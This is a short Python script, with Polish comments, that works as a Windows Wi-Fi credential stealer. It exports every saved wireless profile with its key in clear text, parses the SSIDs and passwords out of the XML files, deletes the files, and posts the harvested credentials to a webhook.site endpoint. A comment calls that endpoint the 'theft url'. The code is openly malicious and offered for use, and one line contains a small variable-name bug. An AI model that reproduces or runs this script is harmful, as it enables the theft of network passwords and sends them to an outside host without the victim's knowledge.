import subprocess, os, sys, requests
import xml.etree.ElementTree as ET

#url kradzieja - zmień jak będziesz miał znowu otwarte
url = 'https://webhook.site/b9c579c2-3360-4df0-87ed-e8aa2a474144'

#Listy & słowniki
wifi_files = []
payload = {'SSID':[], "Password":[],}

#wykonaj komendę windowsową
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

#Pokaż swój folder
path = os.getcwd()

#Dodajemy pliki xml do plików wifi
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

#parsujemy pliki xml        
for file in wifi_files:
    tree = ET.parse(files)
    root = tree.getroot()
    SSID = root[0].text
    password = root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(password)
    os.remove(file)

#Kradziejowany upload
payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
r = requests.post(url, params='format=json', data=payload_str)